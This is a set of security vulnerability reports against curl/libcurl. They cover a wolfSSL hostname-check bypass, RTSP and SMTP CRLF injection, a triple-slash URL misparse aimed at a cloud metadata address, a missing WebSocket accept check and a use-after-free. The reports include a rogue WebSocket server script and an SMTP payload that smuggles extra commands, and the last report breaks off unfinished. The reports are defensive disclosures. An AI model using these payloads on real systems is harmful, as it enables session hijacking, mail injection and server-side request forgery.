title: wolfSSL backend disables hostname verification when CURLOPT_SSL_VERIFYPEER is 0
weakness: Improper Validation of Certificate with Host Mismatch
body:
## Summary

When curl is built against wolfSSL, setting CURLOPT_SSL_VERIFYPEER=0 causes a hostname-mismatched certificate to be accepted even though CURLOPT_SSL_VERIFYHOST remains at its default enabled setting. I built wolfSSL from source, built curl against it, and connected to a TLS server presenting a certificate for an unrelated hostname (CN=totally-wrong-hostname.invalid) while requesting https://localhost/; the handshake completed and the HTTP request/response exchanged normally. This reproduced identically on released curl 8.21.0 and current HEAD (5c61e16869 / 8.22.0-DEV). A control run of the identical reproducer against curl's OpenSSL backend correctly rejected the same certificate ("certificate subject name ... does not match target hostname"), confirming this is specific to the wolfSSL backend rather than a general curl behavior. A second control -- the wolfSSL backend with fully default options (CURLOPT_SSL_VERIFYPEER left at its default of 1) -- correctly rejected the same server, isolating the bug precisely to the VERIFYPEER=0 condition.

## Affected Version

- curl/libcurl 8.21.0 (release tag curl-8_21_0), built with -DCURL_USE_WOLFSSL=ON against wolfSSL built from upstream source
- Also reproduced on current HEAD, commit 5c61e16869 (8.22.0-DEV), identical build configuration
- wolfSSL version used: built from wolfSSL upstream master (~5.9.2) via ./configure --enable-opensslextra --enable-curl --enable-static --enable-shared && make && make install
- curl -V output from the HEAD build used: curl 8.22.0-DEV (Linux) libcurl/8.22.0-DEV wolfSSL/5.9.2 zlib/1.3.1
- Affected: curl/libcurl when built with the wolfSSL TLS backend. Not claiming this affects any other TLS backend; OpenSSL was tested directly as a control and does not exhibit this behavior (see below).

## Steps to Reproduce

1. Build wolfSSL from source with --enable-opensslextra --enable-curl.
2. Build curl (release tag curl-8_21_0, or HEAD) with -DCURL_USE_WOLFSSL=ON against that wolfSSL build.
3. Generate a self-signed certificate for a hostname that does not match the target, e.g. CN=totally-wrong-hostname.invalid.
4. Start a minimal TLS server (Python ssl module is sufficient) on localhost using that certificate.
5. Using a minimal libcurl client, set CURLOPT_URL to https://localhost:<port>/, set CURLOPT_SSL_VERIFYPEER to 0, and leave CURLOPT_SSL_VERIFYHOST unset (default enabled).
6. Call curl_easy_perform().
7. Observe the TLS handshake completes and the HTTP request/response exchange succeeds despite the hostname mismatch.
8. Control 1: repeat the identical reproducer linked against curl's OpenSSL backend instead. Observe it correctly rejects the connection.
9. Control 2: repeat the identical reproducer against the wolfSSL backend with fully default options (do not set CURLOPT_SSL_VERIFYPEER at all). Observe it correctly rejects the connection, isolating the bug to the VERIFYPEER=0 condition specifically.

This was implemented as a minimal libcurl C reproducer (tls_repro.c) driving a minimal Python TLS test server (https_server.py) that serves the mismatched-hostname certificate and logs whether the handshake completed. Both are attached to this report as the PoC.

## Vulnerable Source

lib/vtls/wolfssl.c:
- wssl_ctx_init() / connection setup: sets wolfSSL_CTX_set_verify(wctx->ssl_ctx, conn_config->verifypeer ? WOLFSSL_VERIFY_PEER : WOLFSSL_VERIFY_NONE, NULL) -- so the whole wolfSSL-internal verification pipeline runs in non-failing (WOLFSSL_VERIFY_NONE) mode whenever verifypeer is off.
- wssl_connect_step1(): registers an SNI-based hostname check via wolfSSL_check_domain_name(wssl->ssl, connssl->peer.sni), gated only on conn_config->verifyhost (correctly independent of verifypeer at the point of registration).
- wssl_connect_step2(): after wolfSSL_connect(), there is an explicit, independent post-handshake re-check for the case where the target is a raw IP address (no SNI) -- but no equivalent independent re-check exists for the SNI/named-host case. The code goes straight to if(ret == WOLFSSL_SUCCESS) return CURLE_OK;. Under WOLFSSL_VERIFY_NONE, wolfSSL_connect() returns success regardless of whether the registered domain check matched, and for the SNI path there is nothing left afterward to catch that.

Net effect: the hostname check is registered independently of verifypeer, but its enforcement is not -- it is silently absorbed by the same "do not fail on verification problems" mode that verifypeer=0 turns on.

## Weakness

Improper Validation of Certificate with Host Mismatch -- CWE-297. curl's own documentation states that CURLOPT_SSL_VERIFYHOST operates independently of CURLOPT_SSL_VERIFYPEER; on the wolfSSL backend that independence is not actually enforced at the point where it matters (post-handshake), even though it is correctly reflected at the point of registering the check.

## Severity

Medium.

Justification: this is a demonstrated, reproducible hostname-verification bypass with real MITM impact, backed by curl's own historical precedent of assigning CVEs to this exact bug class (verifypeer/verifyhost independence failures) in a different backend context previously. We are not rating this higher than Medium initially because it requires a specific, non-default application configuration (CURLOPT_SSL_VERIFYPEER=0) combined with a specific TLS backend choice (wolfSSL) rather than being exploitable against curl's default configuration or an arbitrary curl build, and because we have not surveyed how common this backend/option combination is in real-world deployments.

Illustrative CVSS 3.1 vector for the demonstrated scenario: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N. Offered only as a concrete reference point for how we reasoned about the demonstrated test, not as a claim of the final score -- we recognize curl's security team makes the final severity determination.

## Remediation

Add an explicit, independent post-handshake hostname check for the SNI (named-host) case in wssl_connect_step2(), structured like the existing IP-address-specific check that already exists a few lines below it: after a successful wolfSSL_connect(), when conn_config->verifyhost is set and an SNI hostname was used, verify the presented certificate's subject/SAN against that hostname independently of whatever WOLFSSL_VERIFY_NONE already decided, and fail the connection if it does not match -- mirroring how the IP-address path already re-checks via wolfSSL_X509_check_ip_asc() regardless of the configured verify mode.

## Regression Test

Add a libcurl test case that, when built against wolfSSL, connects with CURLOPT_SSL_VERIFYPEER=0 and default CURLOPT_SSL_VERIFYHOST to a server presenting a certificate for an unrelated hostname, and asserts the connection is rejected with a peer/host verification error rather than succeeding.

## Impact

## Confirmed impact

An attacker positioned on the network path (or a compromised/malicious server) can present a certificate for any hostname and have it silently accepted by a curl/wolfSSL client that has set CURLOPT_SSL_VERIFYPEER=0 while relying on CURLOPT_SSL_VERIFYHOST's default to still protect against impersonation -- a common, documented, and reasonable pattern (e.g. connecting to internal hosts with self-signed or CA-less certificates while still expecting the requested hostname to be enforced). This defeats hostname-based MITM protection entirely for such connections. Demonstrated end to end with a real TLS handshake and HTTP exchange, not inferred from source reading alone.

## Limitations

- Requires the application to explicitly set CURLOPT_SSL_VERIFYPEER=0; this is not curl's default behavior and is not triggerable without that specific application configuration.
- Requires curl to be built with the wolfSSL TLS backend specifically. We tested OpenSSL directly as a control and it is not affected. We have not tested every other curl TLS backend and are not claiming this is universal across backends.
- We have not identified a specific named open-source application that uses this exact option combination with the wolfSSL backend.

title: RTSP CRLF injection in libcurl allows CURLOPT_RTSP_* values to inject commands into independent sessions
body:
## Summary

libcurl's RTSP code interpolates the values of `CURLOPT_RTSP_STREAM_URI`, `CURLOPT_RTSP_TRANSPORT`, and `CURLOPT_RTSP_SESSION_ID` directly into the RTSP request text with no check for embedded CR/LF, so a value containing `\r\n` splits one intended RTSP operation into multiple independent RTSP requests on the wire. I reproduced this on libcurl 8.21.0 and current HEAD (`5c61e16869` / `8.22.0-DEV`). Using a stateful test server modeling independent named RTSP resources (the way small/embedded RTSP servers, e.g. IP cameras and NVRs, commonly track a fixed set of channels), I demonstrated that an application performing a single, legitimate `SETUP` on its own resource can have a smuggled `TEARDOWN` command injected via `CURLOPT_RTSP_STREAM_URI` that terminates a completely independent, already-active session established over a separate connection by an unrelated party. The victim's later request against its own session then fails with `454 Session Not Found`, even though the injecting application never referenced that session or resource. None of the three affected options are documented as raw/unsanitized protocol syntax -- unlike `CURLOPT_HTTPHEADER`, which explicitly warns it applies no filtering -- each is documented as a single well-formed value (a stream URI, a transport spec, a session ID). AI assistance (Claude) was used during source analysis, experiment design, and drafting this report; all technical claims and the reproduction below were independently run and verified by the researcher.

## Affected Version

- curl/libcurl 8.21.0 (release tag `curl-8_21_0`)
- Also reproduced on current HEAD, commit `5c61e16869` (`8.22.0-DEV`)
- Build used for reproduction: local build from source, OpenSSL backend
- RTSP is compiled in by default (`CURL_DISABLE_RTSP` defaults to `OFF`; RTSP is not listed as experimental in `docs/EXPERIMENTAL.md`)
- `curl -V` output from the two builds used:
  - `curl 8.21.0-DEV (Linux) libcurl/8.21.0-DEV OpenSSL/3.5.5 zlib/1.3.1`
  - `curl 8.22.0-DEV (Linux) libcurl/8.22.0-DEV OpenSSL/3.5.5 zlib/1.3.1`

## Steps to Reproduce

1. Build curl from the `curl-8_21_0` tag (or use HEAD) with RTSP support (default-on).
2. Stand up a stateful RTSP test server that tracks session state per named resource path (e.g. `/camera-A`, `/camera-B`) globally, independent of which TCP connection issues a request -- modeling how small/embedded RTSP servers commonly implement a fixed set of channels.
3. Victim, connection #1: send `SETUP /camera-A RTSP/1.0` then `PLAY /camera-A RTSP/1.0`. Server marks `/camera-A` active and returns `200 OK` for both.
4. Unrelated application, connection #2: using an unmodified libcurl client, call `curl_easy_setopt(CURLOPT_URL, "rtsp://HOST/camera-B")` and set `CURLOPT_RTSP_STREAM_URI` to a value containing an embedded CR/LF sequence, then issue a `SETUP` request. The application's intent is exactly one operation, on its own resource, `/camera-B`.
5. Capture the raw bytes leaving the client on connection #2 and confirm they contain two independent, well-formed RTSP requests: the intended `SETUP /camera-B RTSP/1.0` followed by an attacker-influenced `TEARDOWN /camera-A RTSP/1.0`.
6. Confirm server-side that `/camera-A`'s session state transitions from active to torn down as a direct result of processing connection #2's bytes -- a resource that connection, that application call, and that `curl_easy_setopt` invocation never referenced.
7. Victim, connection #3 (a fresh connection resuming its own session, matching the documented use of `CURLOPT_RTSP_SESSION_ID`: "Useful for resuming an in-progress session"): send `PLAY /camera-A RTSP/1.0`. Confirm the response is `454 Session Not Found` instead of the `200 OK` it would have received before step 4-6.
8. Repeat with a clean, well-formed `CURLOPT_RTSP_STREAM_URI`/`CURLOPT_RTSP_TRANSPORT` value (control case) and confirm exactly one request is sent and no cross-session effect occurs.

This was implemented as: a standalone libcurl C reproducer (`rtsp_repro.c`, parameterized by mode) driving the malicious `SETUP`; a stateful Python RTSP test server (`rtsp_stateful_server.py`) tracking per-resource session state and logging every parsed request plus the resulting state table; and a driver (`rtsp_crosssession_test.py`) that runs the full three-connection sequence and prints the server-side causal log end to end. All three are attached to this report as the PoC.

## Vulnerable Source

`lib/rtsp.c`:
- `rtsp_setup_request()`: `b->session_id`, `b->stream_uri`, and the value passed to `rtsp_header_alloc()` for the `Transport:` header are read directly from `CURL_EASY_STR(data, STRING_RTSP_SESSION_ID / STREAM_URI / TRANSPORT)` with no validation.
- `rtsp_header_alloc()`: `*target = curl_maprintf("%s: %s\r\n", header_name, value)` -- raw, unescaped interpolation.
- Request-line construction inside `rtsp_do()`:
```
curlx_dyn_addf(&req_buffer,
               "%s %s RTSP/1.0\r\n"     /* Request Stream-URI RTSP/1.0 */
               "CSeq: %u\r\n",
               block.request, block.stream_uri, rtsp->CSeq_sent);
...
curlx_dyn_addf(&req_buffer, "Session: %s\r\n", block.session_id);
```
`block.stream_uri` sits directly in the request line; `block.session_id` and the Transport value sit directly in header lines. None of the three is checked for CR/LF anywhere in this file.

The same function does explicitly guard against the application setting `CSeq` or `Session` as a custom header via `CURLOPT_HTTPHEADER` ("Session ID cannot be set as a custom header") -- the maintainers were alert to header confusion through that specific path, just not to CR/LF embedded inside the values of these three dedicated RTSP options. This pattern -- an app-supplied `CURLOPT_*` string interpolated unchecked into a line-oriented protocol command -- is the same shape as several fixes curl has shipped in the last two months for other protocols (SMTP envelope address, FTP ACCT, MIME part name/filename, gopher selector, MQTT topic, LDAP filter values), none of which touched RTSP.

We checked the documentation for all three options before reporting: CURLOPT_RTSP_STREAM_URI.md, CURLOPT_RTSP_TRANSPORT.md, and CURLOPT_RTSP_SESSION_ID.md each describe a single, well-formed data value (a URI, a transport specification, a session identifier) and give example values that are never raw multi-line protocol text. None carries any disclaimer comparable to CURLOPT_HTTPHEADER's explicit "libcurl passes on the verbatim strings you give it, without any filter or other safe guards. That includes white space and control characters." CURLOPT_RTSP_SESSION_ID.md even contains a security-motivated WARNING about a different risk (session-ID reuse across hosts on a reused handle) without ever mentioning CR/LF -- indicating this is a gap in what the maintainers considered, not a deliberately accepted and documented risk.

## Impact

### Confirmed impact

Using a stateful test server modeling independent named RTSP resources (not a real IP camera or NVR product -- a synthetic model of that class of server's session-tracking behavior), we demonstrated that a single `CURLOPT_RTSP_STREAM_URI` value, supplied by an application performing a `SETUP` against its own resource, can smuggle a second, fully independent, well-formed RTSP request (`TEARDOWN`) that terminates a different, already-active session established over an entirely separate connection by an unrelated party. The causal chain was traced end to end: the victim's session shows as active before the injection, the server's session-state log shows the transition to torn down attributed to the unrelated connection's request, and the victim's own subsequent request against the same resource independently confirms the loss (`454 Session Not Found`). This is unauthorized cross-session/cross-resource command injection with a demonstrated availability impact on a party the injecting application had no relationship to, reproduced identically on 8.21.0 and HEAD.

### Limitations

- The test server is a minimal synthetic model built to isolate and prove the session-tracking-by-resource behavior pattern; we have not tested against, and are not claiming to have compromised, any specific real IP camera, NVR, or other RTSP server product. Real servers' session-identification strategies vary (some may key strictly on server-issued session tokens rather than resource path), which would change exploitability details without changing the underlying request-splitting primitive.
- Exploitation requires a necessary precondition: the application must pass attacker-controlled or attacker-influenced data into one of `CURLOPT_RTSP_STREAM_URI`, `CURLOPT_RTSP_TRANSPORT`, or `CURLOPT_RTSP_SESSION_ID` without checking it for CR/LF first. This is not exploitable against curl by default or without that specific application behavior.
- We did not attempt to demonstrate RTP/media-stream redirection via an injected `SETUP` with altered Transport parameters. That remains a plausible further consequence we have not built or verified, and we are not claiming it.
- Not demonstrated: confidentiality impact, authentication bypass, or code execution.
- We have not identified a specific named open-source application using this exact option-forwarding pattern.

## Weakness

Improper Neutralization of CRLF Sequences ('CRLF Injection') -- CWE-93. This is the correct protocol-agnostic classification for the mechanism (curl's own recent fixes for the same shape of bug in SMTP/FTP/MIME/gopher/MQTT/LDAP fall under the same weakness). The demonstrated consequence here is unauthorized command injection affecting an independent session/resource; if the program's taxonomy has a more specific category it considers a better fit for that consequence, we'd defer to their judgment, but CWE-93 is our primary recommendation as it accurately names the root cause.

## Severity

Medium, offered as our assessment -- we recognize curl's security team makes the final determination and the illustrative CVSS vector below is not a substitute for that.

Justification: this is a demonstrated, reproducible instance of one application's single, legitimate operation on its own resource causing unauthorized termination of an independent, unrelated party's active session on a different resource -- a genuine violation of the isolation that's supposed to exist between independent RTSP sessions, not merely malformed output. We are not rating it higher than Medium because of the necessary precondition identified above (the application must first forward attacker-controlled or attacker-influenced data into one of these three options; this is not triggerable against arbitrary curl usage or by default), because the demonstration is against a synthetic test server modeling this class of server's session-tracking behavior rather than a verified real product, and because no confidentiality impact or authentication bypass has been shown.

Illustrative CVSS 3.1 vector for the demonstrated scenario: AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:L. We offer this only as a concrete reference point for how we reasoned about the demonstrated test, not as a claim of the final score.

## Remediation

Add the same CR/LF rejection already used for SMTP/FTP/MIME/gopher/MQTT/LDAP at the three read points in `rtsp_setup_request()`:
```
b->session_id = CURL_EASY_STR(data, STRING_RTSP_SESSION_ID);
if(b->session_id && strpbrk(b->session_id, "\r\n")) {
  failf(data, "Refusing to send a Session ID with a CR or LF");
  return CURLE_BAD_FUNCTION_ARGUMENT;
}
```
...mirrored for STRING_RTSP_STREAM_URI and the value passed into rtsp_header_alloc() for STRING_RTSP_TRANSPORT. Given how many call sites across the codebase now carry this same hand-written check, a shared helper (e.g. Curl_str_has_crlf()) used by all of them, including this one, would reduce the risk of the next protocol handler missing it.

## Regression Test

Add a libcurl test case: set CURLOPT_RTSP_STREAM_URI (and separately CURLOPT_RTSP_TRANSPORT, CURLOPT_RTSP_SESSION_ID) to a value containing "\r\nX-Injected: yes", issue a SETUP/PLAY, and assert curl_easy_perform() returns CURLE_BAD_FUNCTION_ARGUMENT before anything reaches the wire -- mirroring the structure of the existing SMTP CR/LF regression test (test 2110).

## AI Disclosure

AI assistance (Claude) was used during source analysis, experiment design, and preparation of this report. All technical claims, the reproduction steps, and the source citations above were independently run and verified by the researcher before submission; nothing in this report is asserted on the basis of AI output alone.

## Impact

## Confirmed impact

Using a stateful test server modeling independent named RTSP resources (not a real IP camera or NVR product -- a synthetic model of that class of server's session-tracking behavior), we demonstrated that a single CURLOPT_RTSP_STREAM_URI value, supplied by an application performing a SETUP against its own resource, can smuggle a second, fully independent, well-formed RTSP request (TEARDOWN) that terminates a different, already-active session established over an entirely separate connection by an unrelated party. The causal chain was traced end to end: the victim's session shows as active before the injection, the server's session-state log shows the transition to torn down attributed to the unrelated connection's request, and the victim's own subsequent request against the same resource independently confirms the loss (454 Session Not Found). This is unauthorized cross-session/cross-resource command injection with a demonstrated availability impact on a party the injecting application had no relationship to, reproduced identically on 8.21.0 and HEAD.

## Limitations

- The test server is a minimal synthetic model built to isolate and prove the session-tracking-by-resource behavior pattern; we have not tested against, and are not claiming to have compromised, any specific real IP camera, NVR, or other RTSP server product.
- Exploitation requires a necessary precondition: the application must pass attacker-controlled or attacker-influenced data into one of CURLOPT_RTSP_STREAM_URI, CURLOPT_RTSP_TRANSPORT, or CURLOPT_RTSP_SESSION_ID without checking it for CR/LF first. This is not exploitable against curl by default or without that specific application behavior.
- We did not attempt to demonstrate RTP/media-stream redirection via an injected SETUP with altered Transport parameters, and are not claiming it.
- Not demonstrated: confidentiality impact, authentication bypass, or code execution.

title: URL API: triple-slash parses path segment as hostname
weakness: Use of Incorrectly-Resolved Name or Reference
body:
## Summary

libcurl's URL API misparses http:///host/path. Per RFC 3986, the authority 
between // and / is empty, so /host/path is the path. But parseurl() in 
lib/urlapi.c treats the first segment as the hostname. On line ~1087, the 
slash counter i reaches 3, which is within the valid 1-3 range, and hostp 
is set to whatever follows the third slash. The file:// scheme has special 
handling that correctly handles empty authority — this fix should be 
generalized to other schemes.

## Affected version
libcurl 8.5.0 (Ubuntu 24.04) and 8.21.0 (latest). Confirmed on both.
curl 8.5.0 (x86_64-pc-linux-gnu) libcurl/8.5.0 OpenSSL/3.0.13

## Steps To Reproduce
1. Compile and run the attached poc_tripleslash.c
2. Observe: http:///169.254.169.254/latest/meta-data/
   → host="169.254.169.254", path="/latest/meta-data/"
   Expected: host="" (empty authority), path="/169.254.169.254/latest/meta-data/"
3. Also confirmed via curl CLI: `curl -w "%{url_effective}" http:///path`
   Outputs: http://path/ (path became hostname)

## Impact

An application that constructs URLs from user input and validates the 
parsed hostname via curl_url_get(CURLUPART_HOST) can be tricked into 
making requests to attacker-chosen hosts. For example, if user input 
"/169.254.169.254/latest/meta-data/" is appended to "http://", curl 
parses host="169.254.169.254", enabling SSRF to cloud metadata endpoints.

title: curl Missing Sec-WebSocket-Accept Verification Enables MITM WebSocket Session Hijacking
body:
## Summary

curl's `Curl_ws_accept()` function in `lib/ws.c` processes the 101 Switching Protocols response to a client WebSocket upgrade request. RFC 6455 Section 4.1 mandates that the client MUST verify the `Sec-WebSocket-Accept` response header by computing the SHA-1 hash of the concatenation of the `Sec-WebSocket-Key` value with the magic GUID `258EAFA5-E914-47DA-95CA-C5AB0DC85B11`, base64-encoding the result, and comparing it against the server-returned value. The source code contains a comment describing this requirement (line 1418) but implements no actual verification logic — there is no SHA-1 computation, no header comparison, and no rejection path. The function unconditionally calls `infof(data, "[WS] Received 101, switch to WebSocket")` and switches to WebSocket mode upon receiving any `HTTP/1.1 101 Switching Protocols` response. A network attacker positioned on the `ws://` connection path can return a forged 101 response that entirely omits the `Sec-WebSocket-Accept` header (or includes an arbitrary incorrect value), and curl will accept it and process attacker-controlled WebSocket frames. This enables full man-in-the-middle hijacking of any `ws://` WebSocket transfer.

```python
#!/usr/bin/env python3
"""PoC: send 101 without Sec-WebSocket-Accept — curl accepts it."""
import socket, struct, sys, time

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8766
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", PORT)); s.listen(1)
conn, _ = s.accept()
data = b""
while b"\r\n\r\n" not in data:
    data += conn.recv(4096)
# Send 101 WITHOUT Sec-WebSocket-Accept header
conn.sendall(b"HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n")
time.sleep(0.5)
# Send attacker-controlled WebSocket binary frame
frame = bytes([0x82, 25]) + b"ATTACKER_CONTROLLED_DATA"
conn.sendall(frame)
time.sleep(2)
conn.close(); s.close()
```

Run: `python3 poc.py 8766` then in another terminal: `curl -v ws://127.0.0.1:8766/`

## Affected version

curl 8.22.0-DEV (compiled from master, 2026-08-05)

Platform: Ubuntu 24.04 (x86_64), Debug build with ASan

Source location: `lib/ws.c`, function `Curl_ws_accept()`, lines 1375–1510

The vulnerability has been present since the initial introduction of WebSocket support. No code changes were observed in the current master branch.

## Steps To Reproduce

1. Save the PoC script above as `poc.py`.
2. Start the fake WebSocket server: `python3 poc.py 8766`
3. Run curl: `curl --max-time 5 -v ws://127.0.0.1:8766/`
4. Observe curl output:
   - `< HTTP/1.1 101 Switching Protocols`
   - `* Received 101, Switching to WebSocket`
   - `[WS] Received 101, switch to WebSocket`
5. curl accepts the 101 response without a `Sec-WebSocket-Accept` header, switches to WebSocket mode, and processes the attacker-sent frame. No rejection or error occurs.

Expected compliant behavior: curl MUST compute `base64(SHA1(Sec-WebSocket-Key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))` and verify it matches the `Sec-WebSocket-Accept` value returned by the server. If the header is missing or the value does not match, curl MUST fail the WebSocket connection (RFC 6455 Section 4.1, item 6).


## Again: there is no bug-bounty for curl. We do not offer any rewards, only proper credits.

## Impact

## Summary

An attacker positioned on the network path of a `ws://` WebSocket connection can hijack the WebSocket session by returning a forged 101 Switching Protocols response. Because `Curl_ws_accept()` performs zero verification of the `Sec-WebSocket-Accept` header, the attacker-controlled 101 response is accepted unconditionally.

Once the forged WebSocket session is established, the attacker gains full control:

- **Inject arbitrary WebSocket frames** — The attacker can send arbitrary binary or text frames to the curl client, impersonating the legitimate server. Application logic consuming WebSocket data cannot distinguish genuine server data from attacker-injected data.
- **Intercept client traffic** — Any WebSocket frames the client sends through the hijacked session are visible to the attacker, compromising the confidentiality and integrity of the connection.
- **Bypass application-layer authentication** — Application-level authentication or message integrity checks built on top of the `ws://` WebSocket transport may be undermined, since the attacker controls the entire data channel.

This vulnerability affects all users who use curl's WebSocket support with `ws://` URLs. Connections using `wss://` (WebSocket over TLS) are not affected, as the TLS layer prevents a man-in-the-middle from tampering with the 101 response.

title: Heap use-after-free (write) in mev_forget_socket() via reentrant curl_easy_pause() — incomplete fix for CVE-2026-9080
body:
lib/multi_ev.c keeps a hash table (multi->ev.sh_entries) of per-socket
bookkeeping structs (struct mev_sh_entry) used to decide when to notify the
application's socket callback (CURLMOPT_SOCKETFUNCTION) about interest
changes on a socket.

CVE-2026-9080 ("multi: handle pause in multi socket callback", commit
5ab34cba42e4ee4282fe8bab43f311d51b9bf9bd, reported by Joshua Rogers, closes
#21748) fixed a heap-use-after-free in mev_sh_entry_update(): that function
calls multi->socket_cb(...) and then writes to the `entry` it fetched
*before* the call. curl_easy_pause() is documented as callable from any
callback, and calling it reenters Curl_multi_ev_assess_xfer() ->
mev_pollset_diff(), which can delete (free) that very `entry` if the
reentrant assessment concludes the socket has no remaining users. The fix
re-fetches `entry` from the hash table after the callback returns, before
touching it again, and adds a debug `magic` field specifically to help catch
this class of bug.

The sibling function mev_forget_socket(), in the same file, has the
identical hazard and was not touched by this patch:

    static CURLMcode mev_forget_socket(struct Curl_multi *multi,
                                       struct Curl_easy *data,
                                       curl_socket_t s,
                                       const char *cause)
    {
      struct mev_sh_entry *entry = mev_sh_entry_get(&multi->ev.sh_entries, s);
      int rc = 0;

      if(!entry) return CURLM_OK;

      if(entry->announced && multi->socket_cb) {
        mev_in_callback(multi, TRUE);
        rc = multi->socket_cb(data, s, CURL_POLL_REMOVE,
                              multi->socket_userp, entry->user_data);
        mev_in_callback(multi, FALSE);
        entry->announced = FALSE;   /* <-- UAF: entry may already be freed */
      }

      mev_sh_entry_kill(multi, s);
      ...
    }

If the application's socket callback, invoked at the CURL_POLL_REMOVE
notification, calls curl_easy_pause() on any transfer sharing the same
socket (realistic with HTTP/2 multiplexing, where multiple transfers share
one connection/socket), that reentrant call can free `entry` via
mev_sh_entry_kill() before control returns to the outer frame. The
subsequent `entry->announced = FALSE;` is a heap-use-after-free WRITE.
=====================================================================
STEPS TO REPRODUCE / PROOF OF CONCEPT
=====================================================================

Two independent proofs of concept are provided.

Method 1: whitebox harness (deterministic, targets the exact write)

The actual, unmodified lib/multi_ev.c (not a reimplementation) was compiled
as part of a real ASan-instrumented libcurl build:

  CFLAGS='-fsanitize=address -fno-omit-frame-pointer -g -O0' \
  LDFLAGS='-fsanitize=address' \
  ./configure --disable-shared --enable-debug --without-ssl
  make -C lib

A small harness (attached: curl_uaf_harness.c) #includes the real
multi_ev.c and calls the real exported Curl_multi_ev_socket_done() (the
thin public wrapper around mev_forget_socket()), with a socket_cb that
deletes the socket's hash entry from inside the callback, reproducing what
a reentrant curl_easy_pause() call does:

  gcc -DHAVE_CONFIG_H -I../include -I../lib -I. -DDEBUGBUILD -DCURLDEBUG \
      -DBUILDING_LIBCURL -D_GNU_SOURCE -fsanitize=address \
      -fno-omit-frame-pointer -g -O0 -c curl_uaf_harness.c -o curl_uaf_harness.o
  gcc -fsanitize=address -g -o curl_uaf_poc curl_uaf_harness.o .libs/libcurl.a \
      -lnghttp2 -lidn2 -lrtmp -lldap -llber -lpsl -lzstd -lbrotlidec -lz -lpthread
  ./curl_uaf_poc

AddressSanitizer reports a heap-use-after-free WRITE of size 1 at
multi_ev.c:213 (entry->announced = FALSE;), with the free happening at
multi_ev.c:133 (mev_sh_entry_kill) inside the callback invoked from
mev_forget_socket at multi_ev.c:210 — exactly the predicted reentrancy
window. Full ASan output attached (poc_output.txt).

Scope note: this harness triggers the reentrant free directly inside the
socket callback rather than through a live two-easy-handle HTTP/2 connection
with a genuine curl_easy_pause() call racing real socket I/O. It targets the
exact vulnerable write with real, unmodified function bodies, the real
exported entry point, and the real heap allocator via an actual ASan-built
libcurl.

Method 2: live, organic reproduction (real network I/O, no internal headers)

live_h2_client.c (attached) uses only curl's public API to drive two easy
handles through a real curl_multi_socket_action() event loop against a real
local nginx HTTP/2 (cleartext, prior-knowledge) server, injecting
curl_easy_pause() calls on both handles from inside CURLMOPT_SOCKETFUNCTION
whenever the shared socket is removed — the same reentrancy pattern
CVE-2026-9080 addressed in mev_sh_entry_update().

This reproduces deterministically (5/5 runs): handle A's IPv6 connect
attempt is refused (nginx listens IPv4-only), and while curl tears down
that failed connection's socket, the injected curl_easy_pause() calls
reentrantly corrupt multi_ev.c's bookkeeping, tripping DEBUGASSERT(NULL) in
mev_pollset_diff() at multi_ev.c:420 ("transfer lost interest but is not
registered"). This is a different specific invariant than the Method 1
write at line 213, but the same root cause (curl_easy_pause() reentrancy
from inside the socket callback). In a non-DEBUGBUILD (production) binary
this particular assertion is a no-op, so this exact manifestation's
real-world consequence there is silently-inconsistent internal state rather
than a guaranteed abort — Method 1's line-213 write remains the clearer
evidence of a consequence that matters in production (non-debug) builds.
Full log attached (live_repro_output.txt), along with a screen recording of
a live run for easier triage (live_h2_repro.mp4; the source asciinema
terminal recording, live_h2_repro.cast, is also included).

## Impact

A heap-use-after-free write in a library embedded in an enormous number of
network-facing daemons, tools, and language bindings. Concretely
demonstrated impact is a deterministic crash (SIGABRT under ASan); without
instrumentation, the practical effect depends on what the allocator has
placed in the freed slot by the time the write occurs, which was not
established beyond "reasoned as potentially exploitable, not verified against
a specific target". Reachable by any application using curl's multi-socket
interface (CURLMOPT_SOCKETFUNCTION) that calls curl_easy_pause() from its
socket callback while multiple transfers share a socket — most realistically
via HTTP/2 multiplexing. A remote server has some influence over the timing
of connection-teardown/pause-worthy events that lead into this code path.

title: SMTP CRLF injection in custom SMTP recipient operand allows additional SMTP commands after authentication
body:
## Summary

During testing of curl 8.18.0, I observed that CRLF characters embedded in the SMTP recipient operand used with a custom SMTP request are transmitted as additional SMTP commands.

The injected commands are accepted and processed after successful SMTP authentication, allowing multiple SMTP commands to be executed within the same authenticated session.

---

## Product

curl CLI

Version tested:

```
curl 8.18.0
Release-Date: 2026-01-07
```

---

## Environment

* OS: Kali Linux
* curl: 8.18.0
* SMTP AUTH: PLAIN

---

## Steps to Reproduce

1. Configure curl to perform an authenticated SMTP session using a custom SMTP request (EXPN).

2. Supply a recipient operand containing embedded CRLF characters followed by additional SMTP commands.

Example payload structure:

```text
Friends\r\n
MAIL FROM:<probe-sender@example.com>\r\n
RCPT TO:<probe-recipient@example.com>\r\n
DATA\r\n
Subject: injected\r\n
\r\n
curl-smtp-injection-marker-v1\r\n
.
```

3. Execute the SMTP request.

---

## Observed Behavior

The SMTP session authenticates successfully.

Instead of treating the recipient operand as a single parameter, curl transmits the embedded CRLF characters, causing the SMTP server to interpret the following data as additional SMTP commands.

Observed command sequence:

```text
EHLO probe
AUTH PLAIN
EXPN Friends
MAIL FROM:<probe-sender@example.com>
RCPT TO:<probe-recipient@example.com>
DATA
Subject: injected

curl-smtp-injection-marker-v1
.
QUIT
```

The SMTP server accepted the injected transaction and completed the DATA phase successfully.

---

## Expected Behavior

CR and LF characters should not be permitted inside the SMTP recipient operand.

The value should be validated before serialization so it cannot terminate the current SMTP command and inject additional commands.



---

## Evidence

The attached screenshots demonstrate:

* curl version
* Successful authenticated SMTP session
* Additional injected SMTP commands
* Successful completion of the injected DATA transaction
* Marker confirming successful command injection

## Impact

An application that passes attacker-controlled input into the SMTP recipient operand while using custom SMTP requests may unintentionally execute additional SMTP commands within an authenticated SMTP session.

Depending on the application's usage of libcurl/curl, this may allow unintended SMTP operations.

title: libcurl upload read callbacks miss recursive API guard, allowing prohibited multi API reentry and ASAN-confirmed UAF
body:
## Summary:
